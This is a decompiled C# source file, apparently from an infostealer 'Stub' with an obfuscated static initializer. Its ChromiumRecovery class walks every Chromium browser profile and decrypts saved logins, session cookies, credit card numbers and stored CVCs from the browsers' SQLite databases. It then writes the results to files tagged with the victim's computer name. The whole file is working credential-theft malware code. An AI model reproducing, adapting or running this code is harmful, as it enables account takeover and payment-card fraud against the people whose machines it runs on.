using System;
using System.Collections.Generic;
using System.IO;
using dg3ypDAonQcOidMs0w;
using Newtonsoft.Json;

namespace Stub
{
	// Token: 0x02000014 RID: 20
	public static class ChromiumRecovery
	{
		// Token: 0x06000053 RID: 83 RVA: 0x000080C4 File Offset: 0x000062C4
		public static DataExtractionStructs.ChromiumBrowser[] GetAllInfo(DataExtractionStructs.ChromiumBrowserOptions options)
		{
			List<DataExtractionStructs.ChromiumBrowser> list = new List<DataExtractionStructs.ChromiumBrowser>();
			bool flag = (options & DataExtractionStructs.ChromiumBrowserOptions.Logins) == DataExtractionStructs.ChromiumBrowserOptions.Logins;
			bool flag2 = (options & DataExtractionStructs.ChromiumBrowserOptions.Cookies) == DataExtractionStructs.ChromiumBrowserOptions.Cookies;
			bool flag3 = (options & DataExtractionStructs.ChromiumBrowserOptions.CreditCards) == DataExtractionStructs.ChromiumBrowserOptions.CreditCards;
			DataExtractionStructs.ChromiumBrowser[] array;
			if (!flag && !flag2 && !flag3)
			{
				array = new DataExtractionStructs.ChromiumBrowser[0];
			}
			else
			{
				foreach (KeyValuePair<string, string> keyValuePair in Paths.ChromiumBrowsers)
				{
					List<DataExtractionStructs.ChromiumProfile> list2 = new List<DataExtractionStructs.ChromiumProfile>();
					string key = keyValuePair.Key;
					string value = keyValuePair.Value;
					string[] array2 = Paths.ChromiumBrowsersLikelyLocations[key];
					if (Directory.Exists(value))
					{
						BrowserCrypto browserCrypto = new BrowserCrypto(value, array2);
						foreach (string text in ChromiumRecovery.GetProfiles(value))
						{
							string text2 = Path.Combine(value, text);
							DataExtractionStructs.ChromiumLogin[] array3 = null;
							DataExtractionStructs.ChromiumCookie[] array4 = null;
							DataExtractionStructs.ChromiumCreditCard[] array5 = null;
							if (flag && browserCrypto.operational)
							{
								array3 = ChromiumRecovery.GetLogins(text2, browserCrypto);
							}
							if (flag2 && browserCrypto.operational)
							{
								array4 = ChromiumRecovery.GetCookies(text2, browserCrypto);
							}
							if (flag3 && browserCrypto.operational)
							{
								array5 = ChromiumRecovery.GetCreditCards(text2, browserCrypto);
							}
							list2.Add(new DataExtractionStructs.ChromiumProfile(array3, array4, array5, text));
						}
						list.Add(new DataExtractionStructs.ChromiumBrowser(list2.ToArray(), key));
					}
				}
				array = list.ToArray();
			}
			return array;
		}

		// Token: 0x06000054 RID: 84 RVA: 0x0000825C File Offset: 0x0000645C
		public static string[] GetProfiles(string userDataPath)
		{
			List<string> list = new List<string>();
			string[] array;
			if (!Directory.Exists(Path.Combine(userDataPath, "Default")))
			{
				list.Add("");
				array = list.ToArray();
			}
			else
			{
				list.Add("Default");
				int num = 1;
				for (;;)
				{
					string text = Path.Combine(userDataPath, "Profile " + num.ToString());
					if (!Directory.Exists(text))
					{
						break;
					}
					num++;
					list.Add(text);
				}
				array = list.ToArray();
			}
			return array;
		}

		// Token: 0x06000055 RID: 85 RVA: 0x000082E0 File Offset: 0x000064E0
		public static DataExtractionStructs.ChromiumLogin[] GetLogins(string profilePath, BrowserCrypto decryptor)
		{
			List<DataExtractionStructs.ChromiumLogin> list = new List<DataExtractionStructs.ChromiumLogin>();
			string text = Path.Combine(profilePath, "Login Data");
			DataExtractionStructs.ChromiumLogin[] array;
			if (!File.Exists(text))
			{
				array = null;
			}
			else
			{
				byte[] array2 = Utils.ForceReadFile(text, false);
				if (array2 == null)
				{
					array = null;
				}
				else
				{
					SqlLite3Parser sqlLite3Parser;
					try
					{
						sqlLite3Parser = new SqlLite3Parser(array2);
					}
					catch
					{
						return null;
					}
					if (!sqlLite3Parser.ReadTable("logins"))
					{
						array = null;
					}
					else
					{
						for (int i = 0; i < sqlLite3Parser.GetRowCount(); i++)
						{
							byte[] value = sqlLite3Parser.GetValue<byte[]>(i, "password_value");
							string value2 = sqlLite3Parser.GetValue<string>(i, "username_value");
							string text2 = sqlLite3Parser.GetValue<string>(i, "action_url");
							if (value != null && value2 != null && text2 != null)
							{
								if (string.IsNullOrEmpty(text2))
								{
									string value3 = sqlLite3Parser.GetValue<string>(i, "origin_url");
									if (value3 != null)
									{
										text2 = value3;
									}
								}
								string text3 = decryptor.Decrypt(value);
								if (!string.IsNullOrEmpty(text3))
								{
									list.Add(new DataExtractionStructs.ChromiumLogin(value2, text3, text2));
									Counter.Passwords++;
								}
							}
						}
						array = list.ToArray();
					}
				}
			}
			return array;
		}

		// Token: 0x06000056 RID: 86 RVA: 0x0000841C File Offset: 0x0000661C
		public static DataExtractionStructs.ChromiumCookie[] GetCookies(string profilePath, BrowserCrypto decryptor)
		{
			List<DataExtractionStructs.ChromiumCookie> list = new List<DataExtractionStructs.ChromiumCookie>();
			string text = Path.Combine(profilePath, "Network", "Cookies");
			DataExtractionStructs.ChromiumCookie[] array;
			if (!File.Exists(text))
			{
				array = null;
			}
			else
			{
				byte[] array2 = Utils.ForceReadFile(text, false);
				if (array2 == null)
				{
					array = null;
				}
				else
				{
					SqlLite3Parser sqlLite3Parser;
					try
					{
						sqlLite3Parser = new SqlLite3Parser(array2);
					}
					catch
					{
						return null;
					}
					if (!sqlLite3Parser.ReadTable("cookies"))
					{
						array = null;
					}
					else
					{
						for (int i = 0; i < sqlLite3Parser.GetRowCount(); i++)
						{
							string value = sqlLite3Parser.GetValue<string>(i, "host_key");
							string value2 = sqlLite3Parser.GetValue<string>(i, "name");
							string value3 = sqlLite3Parser.GetValue<string>(i, "path");
							byte[] value4 = sqlLite3Parser.GetValue<byte[]>(i, "encrypted_value");
							long value5 = sqlLite3Parser.GetValue<long>(i, "expires_utc");
							bool flag = sqlLite3Parser.GetValue<int>(i, "is_secure") == 1;
							bool flag2 = sqlLite3Parser.GetValue<int>(i, "is_httponly") == 1;
							if (value != null && value2 != null && value3 != null && value4 != null && value5 != 0L)
							{
								string text2 = decryptor.Decrypt(value4);
								if (!string.IsNullOrEmpty(text2))
								{
									list.Add(new DataExtractionStructs.ChromiumCookie(value, value3, value2, text2, value5, flag, flag2));
									Counter.Cookies++;
								}
							}
						}
						array = list.ToArray();
					}
				}
			}
			return array;
		}

		// Token: 0x06000057 RID: 87 RVA: 0x00008594 File Offset: 0x00006794
		public static DataExtractionStructs.ChromiumCreditCard[] GetCreditCards(string profilePath, BrowserCrypto decryptor)
		{
			List<DataExtractionStructs.ChromiumCreditCard> list = new List<DataExtractionStructs.ChromiumCreditCard>();
			string text = Path.Combine(profilePath, "Web Data");
			DataExtractionStructs.ChromiumCreditCard[] array;
			if (!File.Exists(text))
			{
				array = null;
			}
			else
			{
				byte[] array2 = Utils.ForceReadFile(text, false);
				if (array2 == null)
				{
					array = null;
				}
				else
				{
					SqlLite3Parser sqlLite3Parser;
					try
					{
						sqlLite3Parser = new SqlLite3Parser(array2);
					}
					catch
					{
						return null;
					}
					Dictionary<string, string> dictionary = new Dictionary<string, string>();
					if (sqlLite3Parser.ReadTable("local_stored_cvc"))
					{
						for (int i = 0; i < sqlLite3Parser.GetRowCount(); i++)
						{
							string value = sqlLite3Parser.GetValue<string>(i, "guid");
							byte[] value2 = sqlLite3Parser.GetValue<byte[]>(i, "value_encrypted");
							if (value != null && value2 != null)
							{
								string text2 = decryptor.Decrypt(value2);
								if (text2 != null)
								{
									dictionary[value] = text2;
								}
							}
						}
					}
					if (!sqlLite3Parser.ReadTable("credit_cards"))
					{
						array = null;
					}
					else
					{
						for (int j = 0; j < sqlLite3Parser.GetRowCount(); j++)
						{
							string value3 = sqlLite3Parser.GetValue<string>(j, "guid");
							string value4 = sqlLite3Parser.GetValue<string>(j, "name_on_card");
							int value5 = (int)sqlLite3Parser.GetValue<byte>(j, "expiration_month");
							int value6 = (int)sqlLite3Parser.GetValue<short>(j, "expiration_year");
							byte[] value7 = sqlLite3Parser.GetValue<byte[]>(j, "card_number_encrypted");
							string text3 = "NONE";
							if (dictionary.ContainsKey(value3))
							{
								text3 = dictionary[value3];
							}
							if (value4 != null && value5 != 0 && value6 != 0 && value7 != null)
							{
								string text4 = decryptor.Decrypt(value7);
								if (text4 != null)
								{
									list.Add(new DataExtractionStructs.ChromiumCreditCard(value4, text4, text3, value5, value6));
									Counter.CreditCards++;
								}
							}
						}
						array = list.ToArray();
					}
				}
			}
			return array;
		}

		// Token: 0x06000058 RID: 88 RVA: 0x00008764 File Offset: 0x00006964
		public static void SaveChromiumDataToFiles()
		{
			string text = Paths.InitWorkDir();
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			DataExtractionStructs.ChromiumBrowser[] allInfo = ChromiumRecovery.GetAllInfo(DataExtractionStructs.ChromiumBrowserOptions.All);
			string text2 = DateTime.Now.ToString("yyyy-MM-dd_HH.mm.ss");
			string compname = SystemInfo.Compname;
			string text3 = Path.Combine(text, string.Concat(new string[] { "Chromium_passwords_", compname, "_", text2, ".txt" }));
			using (StreamWriter streamWriter = new StreamWriter(text3, false))
			{
				foreach (DataExtractionStructs.ChromiumBrowser chromiumBrowser in allInfo)
				{
					foreach (DataExtractionStructs.ChromiumProfile chromiumProfile in chromiumBrowser.profiles)
					{
						if (chromiumProfile.logins != null && chromiumProfile.logins.Length != 0)
						{
							streamWriter.WriteLine("Browser: " + chromiumBrowser.browserName + ", Profile: " + chromiumProfile.profileName);
							streamWriter.WriteLine(chromiumProfile.GetLoginsString());
							streamWriter.WriteLine();
						}
					}
				}
			}
			string text4 = Path.Combine(text, string.Concat(new string[] { "Chromium_cookies_", compname, "_", text2, ".json" }));
			using (StreamWriter streamWriter2 = new StreamWriter(text4, false))
			{
				List<object> list = new List<object>();
				foreach (DataExtractionStructs.ChromiumBrowser chromiumBrowser2 in allInfo)
				{
					foreach (DataExtractionStructs.ChromiumProfile chromiumProfile2 in chromiumBrowser2.profiles)
					{
						if (chromiumProfile2.cookies != null && chromiumProfile2.cookies.Length != 0)
						{
							foreach (DataExtractionStructs.ChromiumCookie chromiumCookie in chromiumProfile2.cookies)
							{
								list.Add(new
								{
									Browser = chromiumBrowser2.browserName,
									Profile = chromiumProfile2.profileName,
									Domain = chromiumCookie.domain,
									Path = chromiumCookie.path,
									Name = chromiumCookie.name,
									Value = chromiumCookie.value,
									Expiry = chromiumCookie.expiry,
									IsSecure = chromiumCookie.isSecure,
									IsHttpOnly = chromiumCookie.isHttpOnly,
									Expired = chromiumCookie.expired
								});
							}
						}
					}
				}
				string text5 = JsonConvert.SerializeObject(list, 1);
				streamWriter2.Write(text5);
			}
			string text6 = Path.Combine(text, string.Concat(new string[] { "Chromium_credit_cards_", compname, "_", text2, ".txt" }));
			using (StreamWriter streamWriter3 = new StreamWriter(text6, false))
			{
				foreach (DataExtractionStructs.ChromiumBrowser chromiumBrowser3 in allInfo)
				{
					foreach (DataExtractionStructs.ChromiumProfile chromiumProfile3 in chromiumBrowser3.profiles)
					{
						if (chromiumProfile3.creditCards != null && chromiumProfile3.creditCards.Length != 0)
						{
							streamWriter3.WriteLine("Browser: " + chromiumBrowser3.browserName + ", Profile: " + chromiumProfile3.profileName);
							streamWriter3.WriteLine(chromiumProfile3.GetCreditCardsString());
							streamWriter3.WriteLine();
						}
					}
				}
			}
		}

		// Token: 0x06000059 RID: 89 RVA: 0x000038AD File Offset: 0x00001AAD
		static ChromiumRecovery()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		}
	}
}
